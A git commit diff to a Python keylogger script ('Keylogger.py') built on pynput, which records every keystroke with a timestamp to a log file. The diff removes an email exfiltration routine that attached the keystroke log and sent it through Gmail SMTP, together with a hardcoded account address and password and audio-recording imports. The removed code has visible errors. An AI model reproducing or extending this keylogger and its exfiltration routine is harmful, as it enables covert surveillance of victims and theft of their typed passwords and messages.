9219b54e94ad472d4498c6418e79fae6784262c1
Yaser Kassem <69916502+Yasha-Santos@users.noreply.github.com>
2024-03-09 18:54:47 -0500

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -14,49 +14,12 @@ great power
 import pynput
 import logging
 from pynput.keyboard import Key, Listener
-import time
-import os
-from scipy.io.wavfile import write
-import sounddevice as sd
-
-keys_information = "KeyLog.txt"
-email_address = "notaloggerprogram@gmail.com"
-password = "keyl0gger!101"
-
-
 
 # Here you can add the directory you wish to save your log file 
-log_dir = r"C:/Users/Public"
+log_dir = r"C:/Your/Wished/Directory"
 
 # This log file will have all the keystrokes with the time it was typed, in the format as given below (TIME:MESSAGE)
 logging.basicConfig(filename= (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
-
-# Sending the "keylog.txt" file to an email address
-
-def send_email(filename,attachment,toaddr):
-    fromaddr = email_address
-    msg = MIMEMultipart()
-    msg['From'] = fromaddr
-    msg['To'] = toaddr
-    msg['Subject'] = "Log File"
-    body = "Body_of_the_mail"
-    msg.attach(MIMEText(body, 'plain'))
-    filename = filename
-    attachment = open(attachment, 'rb')
-    p = MIMEBase('application', 'octect-stream')
-    p.set_payload(attachment).read()
-    encoders.encode_base64(p)
-    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
-    msg.attach(p)
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    s.starttls()
-    s.login(fromaddr, password)
-    text = msg.as_string()
-    s.sendemail(fromaddr, toaddr, text)
-    s.quit()
-
-count = 0
-keys = []
 
 # In this function it will take each key as a parameter, then this information will
 # be logged in the "keyLog.txt"
